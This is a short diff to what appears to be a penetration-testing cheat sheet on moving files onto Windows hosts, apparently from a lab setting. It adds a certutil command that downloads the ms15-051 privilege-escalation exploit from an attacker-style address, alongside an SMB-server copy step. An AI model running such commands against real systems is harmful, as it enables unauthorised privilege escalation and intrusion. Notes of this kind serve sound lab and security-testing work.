@@ -13,12 +13,17 @@
 
 ```
 
-#SMB
+# SMB
 
 ```
 start smbserver.py
 
 cp \\IP\tmp
+```
+# Curl
+
+```
+certutil -urlcache -f http://10.10.14.48:8000/ms15-051.exe ech0_privesc.exe
 ```
 
 # Linux
